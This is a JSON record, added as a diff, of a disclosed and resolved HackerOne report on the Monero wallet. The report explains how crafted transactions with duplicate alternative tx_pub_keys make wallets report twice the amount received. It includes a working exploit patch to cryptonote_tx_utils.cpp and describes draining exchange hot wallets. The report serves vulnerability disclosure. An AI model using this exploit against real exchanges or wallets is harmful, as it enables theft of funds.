@@ -1,0 +1,131 @@
+{
+  "id": 379049,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzkwNDk=",
+  "url": "https://hackerone.com/reports/379049",
+  "title": "Attcker can trick monero wallet into reporting it recived twice as much with alternative tx_keypubs",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-07-08T00:06:19.804Z",
+  "submitted_at": "2018-07-08T00:06:19.804Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "phiren",
+    "url": "/phiren",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7731,
+    "url": "https://hackerone.com/monero",
+    "handle": "monero",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Monero",
+      "twitter_handle": "monero",
+      "website": "https://getmonero.org",
+      "about": " Monero: the secure, private, untraceable cryptocurrency"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-07-27T21:28:34.494Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-07-27T21:28:34.387Z",
+  "team_member_agreed_on_going_public_at": "2018-07-27T10:19:44.809Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** multiple identical  tx_pub_keys were patched, but you can still use alternative tx_pub_keys to get the same result.\n\n**Description:** An attacker can craft an XMR transaction which causes the receiving wallet to report that it received twice as much XMR as the attacker actually sent.\n\nThe balance of the wallet isn't effected, so a personal user probably won't be ticked, however the doubled amount is reported over the get_transfers RPC call.\n\nThis is especially devastating for automated wallets, such as cryptocurrency exchanges that rely on RPC calls returning the correct result. \n\nThis attack is a slight modification of the previous flaw that was patched in pull request 3985. That flaw allows unlimited multiplication of funds, instead of just a 2x multiplication that this attack allows.\n\nThis attack leverages the alternative tx_pub_keys feature introduced with subaddresses. extra data is arranged so it contains:\n\n1. A dummy tx_pub_key\n2. An array of alternative tx_pub_keys entries all containing the legitimate txkey for each output.\n3. The legitimate tx_pub_key\n\nThe process_new_transaction function will:\n\n1. Grab the dummy tx_pub_key\n2. Grab the array of alternative tx_pub_keys\n3. Scan all the outputs with both the dummy and alternative tx_pub_keys. Which will match on the legitimate tx_pub_keys.\n4. Loop back to the start, grab the legitimate tx_pub_key\n5. Since the alternative keys were not added into the public_keys_seen set, it scans all the outputs again.\n6. Hacked.\n \n## Releases Affected:\n\n * Monero master ebf2818ab5f42b10745cb99d07920f3197c3d914\n * Monero 0.12.3.0 release tag\n * Probably any Monero release since subaddresses were introduced\n\n## Steps To Reproduce:\n\n  1. On the attacking wallet, Patch cryptonote_tx_utils.cpp\n```\n    diff --git a/src/cryptonote_core/cryptonote_tx_utils.cpp b/src/cryptonote_core/cryptonote_tx_utils.cpp\n    index 071ce591..3835690a 100644\n    --- a/src/cryptonote_core/cryptonote_tx_utils.cpp\n    +++ b/src/cryptonote_core/cryptonote_tx_utils.cpp\n    @@ -351,9 +351,15 @@ namespace cryptonote\n           txkey_pub = rct::rct2pk(hwdev.scalarmultBase(rct::sk2rct(tx_key)));\n         }\n         remove_field_from_tx_extra(tx.extra, typeid(tx_extra_pub_key));\n    -    add_tx_pub_key_to_extra(tx, txkey_pub);\n    +    crypto::public_key dummy_key;\n    +    add_tx_pub_key_to_extra(tx, dummy_key);\n    \n         std::vector<crypto::public_key> additional_tx_public_keys;\n    +    for (size_t i = 0; i < destinations.size(); i++)\n    +      additional_tx_public_keys.push_back(txkey_pub); // One for each output.\n    +\n    +    add_additional_tx_pub_keys_to_extra(tx.extra, additional_tx_public_keys);\n    +    add_tx_pub_key_to_extra(tx, txkey_pub);\n    \n         // we don't need to include additional tx keys if:\n         //   - all the destinations are standard addresses\n    @@ -421,9 +427,9 @@ namespace cryptonote\n           output_index++;\n           summary_outs_money += dst_entr.amount;\n         }\n    -    CHECK_AND_ASSERT_MES(additional_tx_public_keys.size() == additional_tx_keys.size(), false, \"Internal error creating additional public keys\");\n    +    //CHECK_AND_ASSERT_MES(additional_tx_public_keys.size() == additional_tx_keys.size(), false, \"Internal error creating additional public keys\");\n    \n    -    remove_field_from_tx_extra(tx.extra, typeid(tx_extra_additional_pub_keys));\n    +    //remove_field_from_tx_extra(tx.extra, typeid(tx_extra_additional_pub_keys));\n    \n         LOG_PRINT_L2(\"tx pubkey: \" << txkey_pub);\n         if (need_additional_txkeys)\n\n  2\\. Compile wallet\n  3\\. Do a regular transfer to an exchange wallet.\n  4\\. Profit.\n\n## Impact\n\nBy depositing and withdrawing the same coins, doubling each time; The attacker could eventually steal all XMR from an exchange hotwallet.",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-08-26T10:19:44.929Z",
+  "allow_singular_disclosure_after": -243061461.99751177,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "muon4",
+    "mohaned0101",
+    "spam404",
+    "thalaivar304",
+    "leetboi",
+    "savitar0x01",
+    "apapedulimu",
+    "dudez",
+    "eveeez",
+    "khizer47",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.2,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
